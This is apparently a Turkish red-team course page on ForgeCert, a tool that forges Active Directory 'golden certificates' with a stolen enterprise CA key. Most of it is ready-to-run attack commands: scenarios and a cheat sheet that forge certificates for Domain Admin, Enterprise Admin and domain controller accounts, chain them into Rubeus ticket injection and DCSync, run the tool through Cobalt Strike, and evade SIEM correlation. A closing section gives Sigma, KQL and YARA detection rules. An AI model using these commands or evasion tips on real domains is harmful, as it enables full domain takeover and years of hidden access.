# ForgeCert

> **Kategori:** [8. Active Directory Sertifika Servisleri](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Lee Christensen (@tifkin_) tarafından GhostPack ailesi bünyesinde geliştirilen; ele geçirilen bir kurumsal Sertifika Yetkilisi (CA) özel anahtarı ile CA sunucusuna hiçbir ağ bağlantısı yapmadan, tamamen çevrimdışı (offline) ortamda etki alanındaki herhangi bir kullanıcı veya bilgisayar adına geçerli, kriptografik olarak imzalanmış "Altın Sertifika" (Golden Certificate) üreten C# tabanlı sahtecilik ve kalıcılık aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında en ölümcül kalıcılık (persistence) tekniklerinden biri Kerberos Altın Biletidir (Golden Ticket). Ancak Golden Ticket, etki alanı genelindeki `KRBTGT` hesap parolasının iki kez sıfırlanmasıyla tamamen geçersiz kılınır. Buna karşılık, bir kurumsal Sertifika Yetkilisinin (Enterprise CA) kök veya ara sertifika özel anahtarı (Private Key) ele geçirildiğinde ortaya çıkan tehdit boyutu katbekat daha yıkıcıdır.

Active Directory mimarisinde, etki alanı denetleyicileri (Domain Controller / KDC), dizin veri tabanındaki `CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local` konteynerinde bulunan CA sertifikalarını koşulsuz şartsız güvenilir kabul eder. Eğer bir istemci sertifikası bu güvenilen CA'nın özel anahtarıyla imzalanmışsa ve geçerli bir İstemci Kimlik Doğrulaması (Client Auth) EKU'suna sahipse, DC bu sertifikayı doğrudan kabul eder ve ilgili kullanıcı adına Kerberos TGT bileti üretir.

**`ForgeCert`**, ele geçirilen bu CA özel anahtarını (`.pfx` formatında) girdi olarak alan ve tamamen **çevrimdışı (offline)** çalışan bir C# (.NET) aracıdır. CA sunucusuna veya AD CS şablonlarına hiçbir RPC/LDAP isteği göndermez; CA üzerinde hiçbir talep (Request) kaydı oluşturmaz. İstenen herhangi bir kullanıcı (Domain Admin, Enterprise Admin, Domain Controller makine hesabı) adına geçerlilik süresi 1 yıldan 10 yıla kadar uzatılabilen, SID eklentisi (KB5014754) içeren ve hiçbir parola değişikliğinden etkilenmeyen "Altın Sertifikalar" (Golden Certificates) üretir.

### Temel Çalışma Mekanizması

1. **CA Özel Anahtarının Yüklenmesi:** Çalınan CA PFX dosyası ve parolası belleğe alınır.
2. **Kriptografik İstemci Anahtar Çifti Üretimi:** Sertifika sahibi için yerel 2048-bit (veya 4096-bit) yeni bir RSA genel/özel anahtar çifti oluşturulur.
3. **X.509v3 Alanlarının İnşası:**
   - **Subject:** Hedef kullanıcının ayırt edici adı (Örn: `CN=Administrator,CN=Users,DC=corp,DC=local`).
   - **Subject Alternative Name (SAN):** Hedef hesabın UPN (`Administrator@corp.local`) veya DNS adı.
   - **EKU (Extended Key Usage):** İstemci Kimlik Doğrulaması (`1.3.6.1.5.5.7.3.2`) ve Akıllı Kart Oturumu (`1.3.6.1.4.1.311.20.2.2`).
   - **Güvenlik Eklentisi (SID Extension):** Microsoft KB5014754 güncellemesi sonrası zorunlu hale gelen `szOID_NTDS_CA_SECURITY_EXT` (`1.3.6.1.4.1.311.25.2`) ASN.1 yapısı içerisine hedef kullanıcının nesne SID değeri (`S-1-5-21-...-500`) gömülür.
   - **Geçerlilik Süresi:** Başlangıç tarihi geçmiş bir zamana, bitiş tarihi ise gelecekte 5-10 yıl sonrasına ayarlanır.
4. **Çevrimdışı İmzalama:** Oluşturulan X.509 sertifikası, çalınan CA özel anahtarı ve SHA256RSA algoritması ile imzalanır ve parola korumalı bir `.pfx` dosyası olarak diske yazılır veya ekrana Base64 olarak basılır.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│             SALDIRGAN ANALİZ / İŞ İSTASYONU (TAMAMEN OFFLINE)          │
│                                                                        │
│  [ Çalınan CA Özel Anahtarı: ca.pfx ] (Mimikatz / DPAPI / Backup)      │
│         │                                                              │
│         ▼                                                              │
│  [ ForgeCert.exe ]                                                     │
│         │                                                              │
│         ├── (1) Yeni 2048-bit RSA Anahtar Çifti Üretilir               │
│         │                                                              │
│         ├── (2) X.509 Yapısı Oluşturulur:                              │
│         │       ├─ Subject : CN=Administrator                          │
│         │       ├─ SAN     : Administrator@corp.local                  │
│         │       ├─ EKU     : Client Authentication                     │
│         │       └─ SID Ext : S-1-5-21-392102...-500 (KB5014754)        │
│         │                                                              │
│         ├── (3) CA Özel Anahtarı ile Çevrimdışı İmzalanır (SHA256)     │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: forged_admin.pfx (Altın Sertifika) ]                         │
└────────────────────────────────────────────────────────────────────────┘
                               │
            (Ağ Üzerinden Yürütme - Yıllar Sonra Bile Geçerli)
                               ▼
┌────────────────────────────────────────────────────────────────────────┐
│                   HEDEF ACTIVE DIRECTORY ETKİ ALANI                    │
│                                                                        │
│  [ Rubeus.exe asktgt /certificate:forged_admin.pfx /ptt ]              │
│         │                                                              │
│         ├── PKINIT AS-REQ İsteği Gönderilir (TCP 88)                   │
│         │                                                              │
│         ▼                                                              │
│  [ ETKİ ALANI DENETLEYİCİSİ (DC / KDC) ]                               │
│         │                                                              │
│         ├── CA Sertifikasını NTAuth Konteynerinde Doğrular (Güvenli)   │
│         ├── İmzayı CA Genel Anahtarıyla Doğrular (Başarılı)            │
│         ├── Parola Kontrolü YAPILMAZ! (Parola değişmiş olsa bile geçer)│
│         │                                                              │
│         ▼                                                              │
│  [ KDC, Administrator TGT Biletini Döner ] ──► DA Yetkisi Elde Edildi!│
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Kriter | Kerberos Golden Ticket (krbtgt) | AD CS Golden Certificate (ForgeCert) |
|---|---|---|
| **Parola Sıfırlaması** | `krbtgt` parolası 2 kez sıfırlandığında biletler anında geçersiz kalır. | Kullanıcı parolası, yönetici parolası veya krbtgt sıfırlansa bile sertifika çalışmaya devam eder. |
| **Geçerlilik ve Ömür** | Varsayılan bilet ömrü 10 saattir (yenileme ile 7 gün). | Üretilen sertifika 5, 10 veya 20 yıl geçerli olacak şekilde ayarlanabilir. |
| **CA İletişimi ve Logları** | KDC ile doğrudan haberleşir. | CA sunucusu ile **SIFIR İLETİŞİM**. CA veritabanında hiçbir log oluşmaz! |
| **İptal Edilme Zorluğu** | krbtgt sıfırlamak nispeten kolay ve iyi bilinen bir prosedürdür. | CA kök sertifikasını iptal etmek tüm kurumsal PKI altyapısını (VPN, Wi-Fi, Akıllı Kartlar) çökerteceği için savunmacılar için kriz seviyesinde zordur. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | ForgeCert | Certipy (forge) | OpenSSL CLI | Mimikatz (crypto) |
|---|---|---|---|---|
| **Çalışma Şekli** | C# (.NET) Yerel / Standalone | Python Betiği | Linux Terminal Komutu | C Native LOLBin / PE |
| **SID Eklentisi (KB5014754)**| 🟢 Tam Destekli (`/Sid:`) | 🟢 Tam Destekli (`-sid`) | 🔴 Karmaşık ASN.1 konfigürasyonu | 🔴 Desteklemez |
| **C2 Execute-Assembly** | 🟢 Mükemmel (Bellek İçi) | 🔴 Desteklemez (Harici Python) | 🔴 Desteklemez | 🟡 Yüksek EDR Alarmı |
| **PKCS#12 (PFX) Çıktısı** | 🟢 Doğrudan Tek Dosya | 🟢 Doğrudan Tek Dosya | 🟡 Çok adımlı dönüşüm gerekir | 🟢 Doğrudan PFX |
| **Kullanım Kolaylığı** | Çok Yüksek (Tek satır komut) | Yüksek | Düşük (OpenSSL konfigürasyonu zor) | Orta |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

ForgeCert, komut satırı bayrakları ile çalınan CA sertifikasını, sahteciliği yapılacak hedef kullanıcıyı ve kriptografik öznitelikleri alır.

### Genel Sözdizimi

```cmd
ForgeCert.exe /CaCertPath:<CA_PFX> /CaCertPassword:<Parola> /Subject:<DN> /SubjectAltName:<UPN> /NewCertPath:<PFX_Yolu> /NewCertPassword:<Parola> [Ek Seçenekler]
```

### Desteklenen Kritik Bayraklar ve Parametreler

| Parametre / Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|
| `/CaCertPath:YOL` | Ele geçirilen CA özel anahtarını barındıran `.pfx` dosyasının yolu (Zorunlu). | `/CaCertPath:C:\Temp\CorpCA.pfx` |
| `/CaCertPassword:PWD` | CA PFX dosyasını açmak için gereken şifre (Şifresiz ise boş bırakılabilir). | `/CaCertPassword:CakeyPass123` |
| `/Subject:DN` | Sertifikanın Subject (Konu) alanına yazılacak X.500 Distinguished Name dizesi. | `/Subject:"CN=Administrator,CN=Users,DC=corp,DC=local"` |
| `/SubjectAltName:UPN` | Kerberos kimlik doğrulaması için kritik olan Subject Alternative Name (SAN) alanı. | `/SubjectAltName:Administrator@corp.local` |
| `/NewCertPath:YOL` | Üretilecek sahte Altın Sertifikanın kaydedileceği dosya yolu. | `/NewCertPath:C:\Temp\da_golden.pfx` |
| `/NewCertPassword:PWD` | Üretilen yeni PFX dosyasını koruyacak şifre. | `/NewCertPassword:Forged2026!` |
| `/Sid:OBJECT_SID` | **KB5014754 Uyumlu:** Hedef hesabın Active Directory nesne SID değeri. | `/Sid:S-1-5-21-392102-120938-500` |
| `/ValidYears:YIL` | Sertifikanın geçerli kalacağı yıl sayısı (Varsayılan: `1`). | `/ValidYears:5` |
| `/CrlUrl:URL` | Sertifikaya eklenecek İptal Listesi (CRL) adresi (KDC'nin çevrimdışı CRL hatası vermesini önler). | `/CrlUrl:http://pki.corp.local/crl/CorpCA.crl` |
| `/Exportable` | Sertifikanın Windows deposuna kurulduğunda özel anahtarının dışa aktarılabilir olmasını sağlar. | `/Exportable` |
| `/Machine` | Sertifikayı bir kullanıcı yerine bilgisayar hesabı bağlamında yapılandırır. | `/Machine` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Domain Administrator Adına 5 Yıllık Altın Sertifika Üretimi

Ele geçirilen kurumsal CA anahtarı (`CorpCA.pfx`) kullanılarak Domain Administrator adına 5 yıl geçerli bir X.509 istemci sertifikası üretilmesi:

```cmd
ForgeCert.exe /CaCertPath:C:\Tools\CorpCA.pfx /CaCertPassword:SecretCaPassword! /Subject:"CN=Administrator,CN=Users,DC=corp,DC=local" /SubjectAltName:Administrator@corp.local /NewCertPath:C:\Tools\admin_golden.pfx /NewCertPassword:Password123! /ValidYears:5
```

**Örnek Konsol Çıktısı Analizi:**

```text
C:\Tools> ForgeCert.exe /CaCertPath:C:\Tools\CorpCA.pfx /CaCertPassword:SecretCaPassword! /Subject:"CN=Administrator,CN=Users,DC=corp,DC=local" /SubjectAltName:Administrator@corp.local /NewCertPath:C:\Tools\admin_golden.pfx /NewCertPassword:Password123! /ValidYears:5

   ______                            ______             __ 
  / ____/____   _____ ____ _ ___    / ____/___   _____ / /_
 / /_   / __ \ / ___// __ `// _ \  / /    / _ \ / ___// __/
/ __/  / /_/ // /   / /_/ //  __/ / /___ /  __// /   / /_  
/_/     \____//_/    \__, / \___/  \____/ \___//_/    \__/  
                    /____/                                  
  v1.0.0

[*] Loading CA certificate from 'C:\Tools\CorpCA.pfx'...
[+] CA Certificate Subject: CN=Corp-Enterprise-CA, DC=corp, DC=local
[+] CA Certificate Serial : 1B0000000100A1B2C3D4E5F6
[+] CA Private Key successfully acquired!

[*] Generating new 2048-bit RSA key pair for target subject...
[*] Constructing X.509 certificate fields...
    Subject DN   : CN=Administrator,CN=Users,DC=corp,DC=local
    SAN (UPN)    : Administrator@corp.local
    EKU          : Client Authentication (1.3.6.1.5.5.7.3.2)
    Valid From   : 10/14/2026 19:35:12
    Valid To     : 10/14/2031 19:35:12 (5 years)
    Serial Number: 4A8912C0912FEA4310928172

[*] Signing certificate with CA private key (SHA256withRSA)...
[+] Successfully forged certificate!
[*] Saving forged certificate to 'C:\Tools\admin_golden.pfx'...
[+] Done! Forged certificate successfully written to disk.
```

*Çıktı Yorumu:* ForgeCert, hiçbir ağ bağlantısı yapmadan CA anahtarıyla imzalanmış ve 2031 yılına kadar geçerli bir `admin_golden.pfx` dosyası inşa etmiştir.

### Senaryo 2: Modern Güçlü Eşleştirme (KB5014754 / SID Extension) ile Altın Sertifika Üretimi

Güncel Windows Server 2022/2025 etki alanı denetleyicileri, sertifikada nesne SID değeri bulunmadığında kimlik doğrulamayı reddedebilir veya denetim (audit) uyarısı üretir. Hedef kullanıcının nesne SID'sini sertifikaya gömerek sömürüyü kusursuz kılmak:

```cmd
ForgeCert.exe /CaCertPath:C:\Tools\CorpCA.pfx /CaCertPassword:SecretCaPassword! /Subject:"CN=Administrator,CN=Users,DC=corp,DC=local" /SubjectAltName:Administrator@corp.local /Sid:S-1-5-21-3921021948-1209384729-1928374621-500 /NewCertPath:C:\Tools\admin_sid_golden.pfx /NewCertPassword:Password123!
```

Bu komut, X.509 uzantıları arasına `1.3.6.1.4.1.311.25.2` (szOID_NTDS_CA_SECURITY_EXT) ASN.1 bloğunu ekler. KDC, sertifikayı doğrularken UPN eşleşmesine bakmaksızın doğrudan SID değerini eşleştirir ve yöneticinin oturumunu açar.

### Senaryo 3: Etki Alanı Denetleyicisi Makine Hesabı Adına Sertifika Sahteciliği ve DCSync

Bir Domain Controller'ın makine hesabı (`DC01$`) adına sertifika üretilerek KDC'den makine TGT'si alınması ve ardından doğrudan `GetNCChanges` (DCSync) ile tüm etki alanı hash'lerinin çekilmesi:

```cmd
ForgeCert.exe /CaCertPath:C:\Tools\CorpCA.pfx /CaCertPassword:SecretCaPassword! /Subject:"CN=DC01,OU=Domain Controllers,DC=corp,DC=local" /SubjectAltName:DC01$.corp.local /Machine /Sid:S-1-5-21-3921021948-1209384729-1928374621-1001 /NewCertPath:C:\Tools\dc01_golden.pfx /NewCertPassword:Password123!
```

### Senaryo 4: Üretilen Altın Sertifikayı Rubeus ile Oturuma Enjekte Etme

Üretilen `admin_golden.pfx`, Rubeus ile Domain Controller'a sunularak Kerberos TGT biletine dönüştürülür ve mevcut komut istemine aktarılır (`/ptt`):

```cmd
Rubeus.exe asktgt /certificate:C:\Tools\admin_golden.pfx /password:Password123! /domain:corp.local /dc:dc01.corp.local /ptt
```

Komut tamamlandığında `klist` çıktısında `Administrator@CORP.LOCAL` biletinin hazır olduğu görülür. Artık `dir \\dc01\c$` veya `PsExec` komutları tam etki alanı yöneticisi haklarıyla yürütülebilir.

### Senaryo 5: CRL Dağıtım Noktası Tanımlayarak İptal Hatasını Aşma

KDC sunucuları, sertifikadaki CRL adresine ulaşamadığında `KDC_ERR_REVOCATION_OFFLINE` hatası verebilir. Bu durumu önlemek için kurumun meşru CRL adresi sertifikaya eklenir:

```cmd
ForgeCert.exe /CaCertPath:CorpCA.pfx /Subject:"CN=Administrator" /SubjectAltName:Administrator@corp.local /CrlUrl:http://pki.corp.local/certenroll/CorpCA.crl /NewCertPath:admin.pfx /NewCertPassword:Pwn
```

### Senaryo 6: C2 Bellek İçi Yürütme (Cobalt Strike / Havoc)

ForgeCert ikilisini diske indirmeden, C2 konsolundan doğrudan bellekte çalıştırmak:

```text
beacon> execute-assembly /opt/GhostPack/ForgeCert.exe /CaCertPath:\\fileshare\loot\CorpCA.pfx /Subject:"CN=Administrator" /SubjectAltName:Administrator@corp.local /NewCertPath:C:\Users\Public\cert.pfx /NewCertPassword:TempPass123!
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `KDC_ERR_REVOCATION_OFFLINE (0x12)` / The revocation function was unable to check revocation | Etki Alanı Denetleyicisi, sertifikanın iptal durumunu kontrol etmek istemiş ancak sertifikada tanımlı CRL noktasına (CDP) veya OCSP sunucusuna erişememiştir. | ForgeCert çalıştırılırken `/CrlUrl:` parametresi ile kurumun erişilebilir meşru CRL URL'si verilmelidir. Veya KDC kayıt defterinde geçici olarak `CertificateRevocationCheck` bypass edilmelidir. |
| `KDC_ERR_CLIENT_NOT_TRUSTED (0x3E)` | Sertifikayı imzalayan CA sertifikası, etki alanındaki `CN=NTAuthCertificates` güvenilen deposunda bulunmamaktadır (Örn: Yetkisiz bir bağımsız CA anahtarı kullanılmıştır). | Yalnızca `NTAuthCertificates` listesinde yer alan kurumsal Enterprise CA kök veya ara anahtarları kullanılmalıdır. Dizin konfigürasyonu LDAP ile doğrulanmalıdır. |
| `KDC_ERR_PADATA_TYPE_NOSUPP (0x10)` | Domain Controller üzerinde PKINIT için gerekli olan `Domain Controller` sertifikası yüklü değildir veya KDC sertifikayı doğrulamayı desteklememektedir. | DC PKINIT desteklemiyorsa, üretilen sertifika Schannel LDAPS kimlik doğrulaması (`Pass-the-Cert`) için kullanılmalı veya PKINIT destekleyen başka bir DC hedeflenmelidir. |
| `KDC_ERR_CERTIFICATE_REVOKED (0x11)` | Sahtecilikte kullanılan orijinal kurumsal CA sertifikasının kendisi savunmacılar tarafından iptal edilmiş (Revoke) veya süresi dolmuştur. | CA sertifikasının geçerlilik durumu `certutil -verify` ile kontrol edilmeli; aktif ve geçerli bir CA anahtarı kullanılmalıdır. |
| `KDC_ERR_BAD_OPTION (0x0D)` / Strong Certificate Mapping Failed | Hedef etki alanında KB5014754 zorlama (Enforcement) modu aktiftir ve sertifikada nesne SID uzantısı (`szOID_NTDS_CA_SECURITY_EXT`) bulunmamaktadır. | ForgeCert çalıştırılırken `/Sid:<Kullanıcı_SID>` bayrağı zorunlu olarak eklenmeli ve hedef hesabın gerçek nesne SID'si ile sertifika üretilmelidir. |
| `System.Security.Cryptography.CryptographicException: The specified network password is not correct` | `/CaCertPassword` bayrağında belirtilen şifre, çalınan PFX dosyasının gerçek şifresiyle uyuşmamaktadır. | CA anahtarı dışa aktarılırken belirlenen şifre doğrulanmalıdır. Eğer Mimikatz ile dışa aktarıldıysa varsayılan parola genellikle `mimikatz` dir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ CA Ağ Trafiği ]   : 🟢 SIFIR (CA sunucusuyla HİÇBİR bağlantı yok)   │
│  [ CA Veritabanı ]   : 🟢 SIFIR (CA üzerinde talep kaydı oluşmaz)     │
│  [ DC Logları ]      : 🔴 YÜKSEK (Event 4768 PKINIT Pre-Auth Olayı)   │
│  [ EDR Süreç İzi ]   : 🟡 ORTA (execute-assembly ile minimize edilir)  │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler ve Kritik Tespit Çelişkisi (Telemetry Gap)

Golden Certificate saldırısının savunma tarafındaki en karakteristik anormalliği **"Telemetri Boşluğu" (Telemetry Gap)** olarak adlandırılır:
- **CA Sunucusu:** Herhangi bir meşru sertifika talep edildiğinde CA üzerinde `Event ID 4886` (Talep Alındı) ve `Event ID 4887` (Sertifika Basıldı) oluşur.
- **Etki Alanı Denetleyicisi:** Sertifika ile PKINIT yapıldığında `Event ID 4768` oluşur ve burada sertifikanın `SerialNumber` ve `IssuerName` bilgileri kaydedilir.
- **ANORMALLİK:** DC üzerinde Event 4768'de geçen seri numaralı bir sertifikanın, CA sunucusunun Event 4887 kayıtlarında **HİÇBİR ZAMAN VAR OLMAMIŞ OLMASI**, etki alanında %100 kesinlikle bir **Golden Certificate (ForgeCert)** kullanıldığının matematiksel kanıtıdır.

### 5.2 Ağ ve EDR İmzaları

- **Ağ Tespiti:** Ağda hiçbir CA DCOM/RPC veya Web Enrollment trafiği oluşmaksızın, bir iş istasyonundan Domain Controller'ın 88 numaralı portuna doğrudan PKINIT Kerberos AS-REQ gönderilmesi.
- **Süreç İmzası:** ForgeCert varsayılan derlemesinde BouncyCastle kriptografi dizgileri ve `szOID_NTDS_CA_SECURITY_EXT` OID referansları yer alır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1649** | Steal or Forge Authentication Certificates | Çalınan CA özel anahtarı ile sahte X.509 istemci sertifikası üretimi. |
| **T1134** | Access Token Manipulation | Elde edilen bilet ile ayrıcalıklı kimlik token'larına bürünme. |
| **T1558.003** | Kerberos Ticket Granting Tickets | Altın sertifika kullanılarak KDC'den TGT elde edilmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Parolası bilinmeyen etki alanı hesaplarına meşru sertifika ile erişim. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Kayıt Dışı Seri Numarası Tespiti** | SIEM sistemleri CA veritabanı ile DC PKINIT loglarını korele ediyorsa, CA üzerindeki son geçerli seri numarasına yakın bir değer taklit edilmelidir. |
| **Diske PFX Dosyası Yazılması** | Üretilen PFX dosyasını diske kaydetmek yerine çıktıyı Base64 dizesi olarak doğrudan C2 oturum belleğinde tutun. |
| **Aşırı Uzun Geçerlilik Süresi** | 20 yıllık sertifika üretmek EDR/SIEM kurallarında "Olağandışı Geçerlilik Süresi" alarmı tetikler. Kurumun standart geçerlilik süresine (Örn: 1 yıl) sadık kalın. |
| **SID Eksikliği Uyarısı** | Modern sistemlerde Event ID 39/40 düşmesini engellemek için hedef hesabın gerçek nesne SID'sini (`/Sid:`) mutlaka ekleyin. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: ForgeCert CLI ve Altın Sertifika Üretim Argümanları Tespiti

```yaml
title: ForgeCert Golden Certificate Tool Execution
id: e912a781-3091-4912-bc12-49102834bfa1
status: experimental
description: Detects command-line arguments indicative of ForgeCert golden certificate forging tool.
author: Modul 11 Security Research
logsource:
  category: process_creation
  product: windows
detection:
  selection_flags:
    CommandLine|contains|all:
      - '/CaCertPath:'
      - '/SubjectAltName:'
      - '/NewCertPath:'
  selection_sid:
    CommandLine|contains:
      - '/Sid:S-1-5-21-'
  condition: selection_flags or selection_sid
falsepositives:
  - Legitimate custom PKI certificate generation utilities (extremely rare)
level: critical
tags:
  - attack.credential_access
  - attack.t1649
```

#### Microsoft Sentinel KQL Sorgusu: Golden Certificate Telemetri Boşluğu Korelasyonu

```kql
// DC'deki PKINIT oturumlarını alıp, CA'da basılmamış olanları tespit eder (Golden Certificate Avcısı)
let IssuedCerts = SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4887
| extend EventDataXML = parse_xml(EventData)
| extend CertSerial = tostring(EventDataXML.EventData.Data[3])
| summarize by CertSerial;
SecurityEvent
| where TimeGenerated > ago(1d)
| where EventID == 4768 and PreAuthType == 16
| extend CertSerial = CertificateSerialNumber
| where isnotempty(CertSerial)
| where CertSerial !in (IssuedCerts)
| project TimeGenerated, TargetUserName, CertificateIssuerName, CertSerial, IpAddress
```

#### YARA Kuralı: ForgeCert Binary ve Kriptografik Metot Tespiti

```yara
rule PostExploit_ForgeCert_Artifacts {
    meta:
        description = "Detects compiled ForgeCert .NET assembly, Golden Certificate generation methods and flags"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "ForgeCert" ascii wide
        $s2 = "/CaCertPath:" ascii wide
        $s3 = "szOID_NTDS_CA_SECURITY_EXT" ascii wide
        $s4 = "1.3.6.1.4.1.311.25.2" ascii wide
        $s5 = "SubjectAltName" ascii wide
        $s6 = "BouncyCastle" ascii
    condition:
        uint16(0) == 0x5A4D and (
            3 of ($s1, $s2, $s3, $s4, $s5, $s6)
        )
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Domain Admin Adına 1 Yıllık Standart Altın Sertifika Üretimi
```cmd
ForgeCert.exe /CaCertPath:C:\Temp\ca.pfx /CaCertPassword:pass /Subject:"CN=Administrator" /SubjectAltName:Administrator@corp.local /NewCertPath:C:\Temp\admin.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Çalınan CA anahtarıyla Administrator adına geçerli bir istemci sertifikası üretir.
- **Ne Zaman Kullanılır?** CA özel anahtarı ele geçirildiğinde etki alanı genelinde sınırsız kalıcılık kurmak için.
- **Parametreler:** `/CaCertPath`: CA anahtarı, `/SubjectAltName`: Hedef yönetici UPN'i, `/NewCertPath`: Çıktı dosyası.

### Komut 2: KB5014754 Uyumlu SID Eklentili Sertifika Üretimi
```cmd
ForgeCert.exe /CaCertPath:ca.pfx /CaCertPassword:pass /Subject:"CN=Administrator" /SubjectAltName:Administrator@corp.local /Sid:S-1-5-21-123-456-789-500 /NewCertPath:admin_sid.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Sertifika içine kullanıcının nesne SID'sini gömerek modern DC güçlü eşleştirme kurallarını aşar.
- **Ne Zaman Kullanılır?** Güncel ve yamalı Windows Server 2022/2025 DC'lerin bulunduğu ortamlarda.
- **Parametreler:** `/Sid`: Hedef hesabın Active Directory nesne SID değeri.

### Komut 3: 10 Yıllık Uzun Vadeli Kalıcılık Sertifikası
```cmd
ForgeCert.exe /CaCertPath:ca.pfx /CaCertPassword:pass /Subject:"CN=Administrator" /SubjectAltName:Administrator@corp.local /ValidYears:10 /NewCertPath:admin_10y.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Geçerlilik süresi 10 yıl olan bir X.509 kimlik doğrulama sertifikası üretir.
- **Ne Zaman Kullanılır?** Kurumsal ağda yıllarca sürecek gizli bir arka kapı bırakmak için.
- **Parametreler:** `/ValidYears:10`: Geçerlilik süresini 10 yıl olarak belirler.

### Komut 4: Domain Controller Makine Hesabı Sahteciliği (DCSync Hedefli)
```cmd
ForgeCert.exe /CaCertPath:ca.pfx /CaCertPassword:pass /Subject:"CN=DC01" /SubjectAltName:DC01$.corp.local /Machine /Sid:S-1-5-21-123-456-789-1001 /NewCertPath:dc01.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Bir etki alanı denetleyicisinin makine hesabı adına sertifika üretir.
- **Ne Zaman Kullanılır?** Makine kimliğiyle KDC'den bilet alıp doğrudan DCSync saldırısı yürütmek için.
- **Parametreler:** `/Machine`: Bilgisayar bağlamında sertifika oluşturur.

### Komut 5: CRL Dağıtım Noktası Belirterek İptal Kontrolünü Geçme
```cmd
ForgeCert.exe /CaCertPath:ca.pfx /CaCertPassword:pass /Subject:"CN=Administrator" /SubjectAltName:Administrator@corp.local /CrlUrl:http://ca.corp.local/crl/corp.crl /NewCertPath:admin.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Sertifika uzantısına geçerli bir CRL URL'si ekleyerek KDC'nin iptal sorgusu hatası vermesini engeller.
- **Ne Zaman Kullanılır?** KDC `KDC_ERR_REVOCATION_OFFLINE` hatası döndürdüğünde.
- **Parametreler:** `/CrlUrl`: Kurumun erişilebilir CRL dağıtım noktası URL'si.

### Komut 6: Şifresiz CA Anahtarı ile Üretim
```cmd
ForgeCert.exe /CaCertPath:unprotected_ca.pfx /Subject:"CN=Administrator" /SubjectAltName:Administrator@corp.local /NewCertPath:admin.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Parolası bulunmayan açık bir CA PFX dosyasını kullanarak sertifika üretir.
- **Ne Zaman Kullanılır?** CA sunucusundan şifresiz dışa aktarılmış anahtarlar kullanıldığında.
- **Parametreler:** `/CaCertPassword` bayrağı verilmez.

### Komut 7: Dışa Aktarılabilir (Exportable) Özel Anahtarla Üretim
```cmd
ForgeCert.exe /CaCertPath:ca.pfx /CaCertPassword:pass /Subject:"CN=Administrator" /SubjectAltName:Administrator@corp.local /Exportable /NewCertPath:admin.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Üretilen sertifikanın Windows sertifika deposuna kurulduğunda özel anahtarının dışa aktarılmasına izin verir.
- **Ne Zaman Kullanılır?** Sertifikanın kurban makinesine kurulup sonradan başka araçlar tarafından okunması gerektiğinde.
- **Parametreler:** `/Exportable`: Özel anahtarı dışa aktarılabilir işaretler.

### Komut 8: Kurumsal E-Posta UPN Formatı ile Sahtecilik
```cmd
ForgeCert.exe /CaCertPath:ca.pfx /CaCertPassword:pass /Subject:"CN=Chief Executive" /SubjectAltName:ceo@corporate.com /NewCertPath:ceo.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Hedef kullanıcının etki alanı UPN'i farklı bir e-posta sonekine sahipse bu adresle sertifika üretir.
- **Ne Zaman Kullanılır?** Çoklu alan adı veya Office 365 / Entra ID ile senkronize hibrit ortamlarda.
- **Parametreler:** `/SubjectAltName`: Kullanıcının tam UPN adresi.

### Komut 9: Enterprise Admin Adına Sertifika Sahteciliği
```cmd
ForgeCert.exe /CaCertPath:ca.pfx /CaCertPassword:pass /Subject:"CN=EntAdmin,CN=Users,DC=root,DC=local" /SubjectAltName:entadmin@root.local /NewCertPath:entadmin.pfx /NewCertPassword:pwn
```
- **Ne Yapar?** Orman kök etki alanındaki Enterprise Administrator adına sertifika üretir.
- **Ne Zaman Kullanılır?** Çoklu etki alanı barındıran orman yapılarında tüm ormanı ele geçirmek için.
- **Parametreler:** `/SubjectAltName`: Orman kök yöneticisi UPN'i.

### Komut 10: Rubeus ile Birlikte Hızlı Doğrulama Zinciri
```cmd
ForgeCert.exe /CaCertPath:ca.pfx /CaCertPassword:pass /Subject:"CN=Administrator" /SubjectAltName:admin@corp.local /NewCertPath:test.pfx /NewCertPassword:pwn && Rubeus.exe asktgt /certificate:test.pfx /password:pwn /ptt
```
- **Ne Yapar?** Altın sertifikayı üretir ve hemen ardından Rubeus ile TGT biletini alıp oturuma enjekte eder.
- **Ne Zaman Kullanılır?** Hızlı otomasyon betiklerinde veya pentest senaryolarında anında yetki elde etmek için.
- **Parametreler:** Zincirleme komut çalıştırma (`&&`).

---

## Kaynaklar

- **Resmi GitHub Reposu:** [GhostPack / ForgeCert](https://github.com/GhostPack/ForgeCert)
